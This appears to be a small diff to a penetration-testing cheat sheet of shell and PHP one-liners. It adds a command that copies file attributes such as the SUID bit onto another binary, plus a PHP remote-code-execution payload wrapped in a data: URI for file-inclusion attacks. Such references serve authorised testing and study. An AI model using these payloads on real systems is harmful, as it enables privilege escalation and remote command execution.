@@ -530,6 +530,9 @@ comm file1_here file2_here
 # compare and only show lines unique to 2nd file
 comm -13 file1_here file2_here
 
+# copy file attributes (e.g. SUID bit)
+cp --attributes-only --preserve=all /path/to/copy/from/binary /path/to/copy/to/binary
+
 # show cron jobs
 crontab -l
 ls -la /etc/ | grep cron
@@ -2705,6 +2708,8 @@ php -S 0.0.0.0:port_here
 
 # data wrapper
 data:text/plain,data_content_here
+# wrapped RCE
+data:text/plain,<?php echo shell_exec("command_here") ?>
 
 # execute commands
 system()
